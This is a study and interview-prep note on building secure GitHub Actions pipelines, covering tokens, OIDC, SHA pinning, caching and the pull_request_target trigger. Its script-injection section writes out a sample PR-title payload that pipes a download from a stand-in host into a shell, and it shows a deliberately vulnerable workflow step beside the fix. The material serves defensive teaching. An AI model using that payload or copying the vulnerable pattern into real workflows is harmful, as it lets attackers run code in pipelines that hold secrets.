# 07. CI/CD with GitHub Actions

Legend: `[SAMPLE]` = example written to show the shape. I cannot run GitHub Actions on this Mac, so there is no captured output here. The security rules (injection, pinning, token permissions, `pull_request_target`, OIDC claims, caching limits, reusable workflow limits) were checked against GitHub's own docs (links at the end).

---

## 1. What it is (plain words + analogy)

**CI** (continuous integration) = every time someone pushes code, a machine **builds it and runs tests**, so problems show up in minutes.
**CD** (continuous delivery or deployment) = the machine also **ships** the tested build to an environment.

**GitHub Actions** is GitHub's built-in robot for this. You put a YAML file in `.github/workflows/`. GitHub starts a fresh virtual machine, runs your steps, and throws the machine away.

Analogy: a **factory conveyor belt with a quality inspector**.
- **Workflow** = the whole belt (one YAML file).
- **Trigger (`on:`)** = what starts the belt (a push, a pull request, a schedule, a manual click).
- **Job** = one station. Jobs run on different machines, in parallel unless you say `needs:`.
- **Step** = one task at a station: a shell command (`run:`) or a ready-made action (`uses:`).
- **Runner** = the machine the job runs on (GitHub-hosted or self-hosted).
- **Action** = a reusable step written by someone (`actions/checkout`).
- **Artifact** = a file passed between jobs. **Cache** = files kept between runs to save time.

## 2. Why it matters in interviews

Platform engineers own the paths to production. Interviewers ask how you build a safe pipeline: no long-lived cloud keys, least privilege, protected production deploys, reusable pipelines for many repos, speed (caching), and how an attacker could abuse a pipeline. The security items (script injection, pinned actions, `pull_request_target`, OIDC) are very common in 2026 because of real supply-chain incidents. One guide mentions the tj-actions/changed-files incident, where people who used a movable tag were hit. Also expect "design the CI/CD for 200 services".

## 3. How it works, step by step

### 3.1 A minimal workflow

```yaml
name: ci
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read                # least privilege for GITHUB_TOKEN

jobs:
  test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@<full-commit-sha>   # pinned, see 3.5
      - uses: actions/setup-python@<full-commit-sha>
        with: { python-version: "3.12", cache: pip }
      - run: pip install -r requirements.txt
      - run: pytest -q
```
Flow:
```
 push/PR ──> GitHub schedules workflow ──> job "test" on a fresh runner VM
                                             checkout -> setup -> install -> test
                                           ──> status check on the PR (green/red)
```
Notes: `<full-commit-sha>` means a real 40-character SHA you look up and verify. I wrote a placeholder so I do not invent a hash. Set `timeout-minutes` so a stuck job does not run for hours. Use `concurrency:` to cancel older runs of the same branch.

### 3.2 Reusable workflows vs composite actions

Both avoid copy-paste. They work at different levels.

| | **Reusable workflow** | **Composite action** |
|---|---|---|
| What it is | A whole workflow file with `on: workflow_call` | An `action.yml` with `runs: using: composite` and a list of steps |
| Called from | A **job** (`jobs.x.uses: org/repo/.github/workflows/build.yml@ref`) | A **step** (`- uses: org/repo/action@ref`) |
| Contains | One or more **jobs** (own runner, own `permissions`, secrets, environments) | Only **steps** that run inside the caller's job and runner |
| Good for | A full standard pipeline (build, scan, deploy) shared by many repos | A small repeated bundle of steps (setup + login + cache) |
| Limits (GitHub docs) | up to 10 levels of nesting; max 50 unique reusable workflows per workflow file; env vars of the caller are not passed in; outputs return values | shares the caller's job context |

Reusable workflow facts from the docs: it is called from a job, so `GITHUB_ENV` cannot pass values to the caller's steps; if the caller job sets no `permissions`, the called workflow gets the default token permissions and "can only reduce those permissions, not raise them"; the called workflow can be in the same repo, a public repo, or an accessible private repo.

```yaml
# caller
jobs:
  build:
    uses: my-org/platform-workflows/.github/workflows/build.yml@<sha-or-tag>
    with: { image-name: web }
    secrets: inherit          # or pass specific secrets one by one (safer)
```
```yaml
# .github/workflows/build.yml in the shared repo
on:
  workflow_call:
    inputs:
      image-name: { type: string, required: true }
```
Rule of thumb: **reusable workflow for the pipeline skeleton, composite action for repeated step bundles.** (The composite-action row is general GitHub knowledge; the doc page I read covers reusable workflows only.)

### 3.3 Least-privilege tokens

Every job gets a temporary `GITHUB_TOKEN` for the GitHub API. GitHub's guidance: set the default to **read-only for contents** and raise permissions **per job**, only where needed; give "minimum required permissions" to any credentials.

```yaml
permissions: {}                 # start from nothing at the top
jobs:
  build:
    permissions: { contents: read }
  release:
    permissions: { contents: write, packages: write }
  deploy:
    permissions: { id-token: write, contents: read }   # id-token only for OIDC
```
Also: protect production with **Environments** that have **required reviewers** (docs: "Use environments with required reviewers to gate access to environment secrets"); anyone with write access to a repo can read its repository secrets, so keep powerful secrets in environments. Restrict which branches can deploy.

### 3.4 OIDC: no long-lived cloud keys

**Old way**: store a cloud access key in GitHub secrets. It never expires, can leak, and must be rotated by hand.
**OIDC way** (OpenID Connect): GitHub issues a **short-lived signed token (a JWT) per job**. The cloud checks it against a trust rule you wrote, and returns short-lived cloud credentials.

```
 job starts ──> asks GitHub: "give me an ID token" (needs permissions: id-token: write)
 GitHub ──> signed JWT {iss, sub, aud, repository, ref, environment, ...}
 job ──> cloud STS (Azure Entra / Google STS / AWS): "here is my token"
 cloud: verifies signature + checks claims against trust policy
 cloud ──> short-lived access token ──> job deploys
```
Claims you can match on (from the GitHub docs): `iss` (issuer), `aud` (audience), `sub` (subject, for example `repo:octo-org/octo-repo:environment:prod`), `repository`, `repository_owner`, `ref`, `sha`, `event_name`, `actor`, `environment`, `job_workflow_ref`, `workflow`, `run_id`, `iat`, `exp`, and optional custom `repo_property_*` claims. 

**Be specific in the trust rule.** Allow only your repo, your protected branch or environment, and ideally the workflow ref. A loose rule such as "any repo in my org" or "any branch" is a security hole. **Current detail (verified in the docs today)**: repositories created after **July 15, 2026** use a new `sub` format that includes owner and repository IDs (not available on GitHub Enterprise Server). If your trust policy matches the `sub` string, check which format your repos send.

Cloud side:
- Google Cloud: **Workload Identity Federation** lets outside workloads reach Google Cloud "without a service account key", uses short-lived tokens, and you can limit identities with attribute conditions. GitHub Actions is a supported source.
- Azure: federated credentials on an app registration or managed identity (and Microsoft Entra Workload ID inside AKS, same idea for pods; see file 11).
- AWS: an IAM OIDC provider and a role with a trust policy (general knowledge; I did not fetch AWS docs).
```yaml
jobs:
  deploy:
    permissions: { id-token: write, contents: read }
    environment: prod
    steps:
      - uses: google-github-actions/auth@<full-commit-sha>
        with:
          workload_identity_provider: projects/123/locations/global/workloadIdentityPools/gh/providers/gh
          service_account: deployer@my-project.iam.gserviceaccount.com
```
(The input names of that action are from memory of its README; check them before use.)

### 3.5 Pin actions

A third-party action is code that runs **with your secrets and token**. If its tag (`@v4`) is moved to malicious code, your pipeline runs it. GitHub's docs: "Pin references to actions to a commit SHA in your workflow files." Also: verify the SHA comes from the **action's own repo and not a fork**. If you use a tag, "only do so for creators you trust", because a tag "can be moved or deleted." The docs also say a workflow lockfile is stronger than SHA pinning where you can adopt one.

```yaml
- uses: actions/checkout@<40-char-sha>   # v4.2.2   <- keep the version in a comment
```
Keep pins fresh with Dependabot for `github-actions` (recommended by several guides). Prefer well-known maintainers, review what an action does, and use fewer actions (a plain `run: curl ... | sh` in your own script is not safer: pin and verify checksums there too).

### 3.6 Script injection

**The bug**: putting untrusted text (pull request title, branch name, issue body, commit message) directly into a `run:` script with `${{ ... }}`. GitHub fills the text in **before** the shell runs, so a title like `"; curl evil.sh | sh #` becomes part of the command.

```yaml
# VULNERABLE
- run: echo "PR title is ${{ github.event.pull_request.title }}"

# SAFE: pass through an environment variable, quote it in the shell
- run: echo "PR title is $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```
Official guidance: "set the value of the expression to an intermediate environment variable" (and the shell treats it as data, not code). Even safer: pass it as an argument to a JavaScript action, which "is not vulnerable to the injection attack". Static checkers such as **zizmor** can find template injection (named in a search result; not verified on its own site).

Related dangerous things:
- **`pull_request_target`** (and `workflow_run`): these run with a **privileged context** (secrets, write token) from the **base** branch. Docs: "Avoid using the `pull_request_target` workflow trigger if it's not necessary", and never **check out untrusted PR code** in those workflows. A flaw here "can be exploited to take over a repository". Use plain `pull_request` for untrusted code (forks get no secrets).
- **Secrets**: never print them, never store as plaintext in workflow files; mask derived values with `::add-mask::`; if a secret leaks into a log, delete the log **and rotate the secret**; don't use structured data (a JSON blob) as one secret.
- **Self-hosted runners** on public repos are risky (anyone's PR can run code on your machine).

### 3.7 Caching and speed

`actions/cache` (or the `cache:` option of setup actions) stores files, such as `~/.cache/pip` or `~/.npm`, between runs.

Facts from GitHub's docs:
- **key**: the name and lookup value (max 512 characters). A common pattern hashes the lockfile: `key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}` so the cache refreshes when dependencies change.
- **restore-keys**: fallbacks tried in order when there is no exact match (prefix match; the newest matching cache wins).
- **Scope**: a run can restore caches from **its own branch or the default branch**; PR runs can also use the base branch; sibling branches cannot share.
- **Size and age**: **10 GB per repository** by default (admins can raise it; usage above that is billed); entries **not used for 7 days** are removed; when full, the oldest-accessed go first.
- **Security warning**: do not cache secrets. Cache contents are not verified before extraction, and anyone who can open a PR can read caches of the base branch.

Other speed tips: run independent jobs in parallel; use `needs:` only when required; `concurrency` with `cancel-in-progress` for PRs; split slow test suites (matrix); use path filters (`paths:`) to skip unrelated jobs; Docker layer caching with BuildKit cache exports (`cache-from` / `cache-to`); smaller images; keep self-hosted runners warm if you use them.

```yaml
- uses: actions/cache@<sha>
  with:
    path: ~/.cache/pip
    key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}
    restore-keys: |
      ${{ runner.os }}-pip-
```

### 3.8 A safe deployment pipeline (shape)

```
 PR opened ──> lint + unit tests + build image + scan (Trivy) + terraform plan / helm diff   (read-only token)
     │
 merge to main ──> build + sign + push image (digest) ──> deploy to dev (OIDC, automatic)
     │
     └──> deploy to prod: Environment "prod" with required reviewers ──> OIDC (narrow trust) ──> helm upgrade --wait ──> smoke test
              └─ on failure: automatic rollback + alert + keep logs
```
Ideas to mention: build **once**, promote the **same image digest** through environments; no `:latest`; track which commit is in which environment; deployment frequency and change failure rate are common success measures (DORA, general knowledge).

## 4. Commands to try

You can test workflows locally in part:
```bash
# lint workflow files (install actionlint first: brew install actionlint)
actionlint
# run workflows locally in Docker (third-party tool "act"; many actions work, not all)
act pull_request
# use the GitHub CLI to see runs and logs
gh run list --limit 5
gh run view <run-id> --log-failed
gh workflow run build.yml -f image-name=web      # trigger workflow_dispatch
gh secret list                                   # names only, never values
```
`[SAMPLE]` `gh run list`:
```
STATUS  TITLE              WORKFLOW  BRANCH  EVENT  ID           ELAPSED  AGE
✓       Fix retry logic    ci        main    push   1234567890   2m10s    1h
X       Bump chart         ci        pr-42   pull_request 1234567891 1m50s 2h
```
(`actionlint`, `act`, and the `gh` subcommands are real tools; I did not run them here.)

## 5. Common mistakes

1. `${{ github.event.* }}` text inside `run:` (script injection).
2. Using `@main` or `@v1` for third-party actions instead of a verified full SHA.
3. Default read-write `GITHUB_TOKEN` for every job.
4. Cloud access keys in GitHub secrets instead of OIDC.
5. OIDC trust rule that is too broad (whole org, any branch).
6. `pull_request_target` that checks out the PR's code.
7. Caching secrets, or cache keys that never change (stale dependencies) or change every run (never hit).
8. No `timeout-minutes`, no `concurrency`, so stuck or duplicate runs waste money and block deploys.

## 6. Eight interview questions with answers

**Q1. Explain workflow, job, step, runner.**
A workflow is a YAML file started by a trigger. It contains jobs. Jobs run on separate runners (fresh VMs) and in parallel unless `needs:` orders them. A job has steps; a step runs a shell command or an action. Data between jobs moves by artifacts or job outputs.

**Q2. Reusable workflow vs composite action: when do you use which?**
A reusable workflow (`workflow_call`) is a whole workflow with its own jobs, runners, permissions, and secrets; call it from a job. Use it for a standard pipeline shared across repos. A composite action bundles steps and runs inside the caller's job; call it from a step. Use it for small repeated step groups. Limits for reusable workflows: nesting up to 10 levels and 50 unique called workflows per file; caller `env` is not passed.

**Q3. How do you stop using long-lived cloud credentials in pipelines?**
OIDC federation. The job requests a short-lived GitHub-signed JWT (permission `id-token: write`). The cloud validates it and checks claims (`sub`, `repository`, `ref`, `environment`) against a narrow trust policy, then issues short-lived credentials. Nothing long-lived is stored, tokens are tied to a run, and access is auditable.

**Q4. What is script injection in Actions and how do you prevent it?**
Untrusted values like PR titles interpolated into `run:` with `${{ }}` become part of the shell command. Prevent it by assigning the value to an environment variable with `env:` and using `"$VAR"` in the script, or by passing it to an action as an input argument. Scan workflows with a linter such as zizmor.

**Q5. Why pin actions to a commit SHA?**
Tags and branches can be moved, so a compromised or malicious update would run in your pipeline with your secrets. A full commit SHA is immutable. Verify the SHA belongs to the action's own repo (not a fork) and use Dependabot to update pins in reviewed pull requests.

**Q6. What is least privilege for `GITHUB_TOKEN`?**
Set repository default token permissions to read-only, declare `permissions:` at workflow level (often empty or `contents: read`), and grant extra permissions per job only where required (for example `packages: write` for the publish job, `id-token: write` for the deploy job).

**Q7. What is dangerous about `pull_request_target`?**
It runs in the context of the base repository with access to secrets and a write token, but it can be triggered by pull requests from forks. If it checks out or runs the PR's code, an attacker can run code with those privileges. Avoid it, or never check out untrusted code in it; use `pull_request` and, if needed, a separate `workflow_run` with careful handling of artifacts.

**Q8. How do you make a pipeline faster and still safe?**
Cache dependencies by lockfile hash (remembering scope, 10 GB limit, 7-day expiry, never cache secrets), run jobs in parallel, use path filters and concurrency cancellation, cache Docker layers, and build once then promote the same image digest. Keep security checks (scans, plan/diff) in the PR path so speed does not remove gates.

## 7. Self-quiz (answers at the end)

1. Which permission must a job have to request an OIDC token?
2. Why is `run: echo "${{ github.event.issue.title }}"` dangerous?
3. How long are unused caches kept, and what is the default size limit per repo?
4. Reusable workflow or composite action: which is called from a `step`?
5. Name one thing to restrict in a cloud trust policy for GitHub OIDC.

**Answers**
1. `id-token: write`.
2. The title is pasted into the script before the shell runs, so an attacker-controlled title can inject commands. Use an env variable.
3. 7 days without access; 10 GB per repository by default.
4. The composite action (`uses:` inside `steps`). A reusable workflow is called at job level.
5. The repository (and ideally branch or environment and workflow ref) in the `sub`/claims, plus the audience.

## 8. Sources

- GitHub, secure use (script injection, SHA pinning, token permissions, secrets, `pull_request_target`): https://docs.github.com/en/actions/reference/security/secure-use
- GitHub, OpenID Connect concepts (claims, `sub` format change after July 15, 2026): https://docs.github.com/en/actions/concepts/security/openid-connect
- GitHub, reusable workflows (limits, permissions): https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations
- GitHub, dependency caching (key, restore-keys, scope, 10 GB, 7 days, security): https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching
- Google Cloud, Workload Identity Federation: https://docs.cloud.google.com/iam/docs/workload-identity-federation
- Prep-site context (indicators only): https://www.kore1.com/devops-engineer-interview-questions/

Not verified from a source: the tj-actions/changed-files incident details (one search-result summary only); zizmor and Dependabot-for-actions recommendations (search summaries); composite action behavior and the comparison table row for it; `google-github-actions/auth` input names; AWS OIDC details; the `gh`, `act`, `actionlint` command details; DORA metrics; the `timeout-minutes` and `concurrency` features (standard Actions syntax, not re-read today).
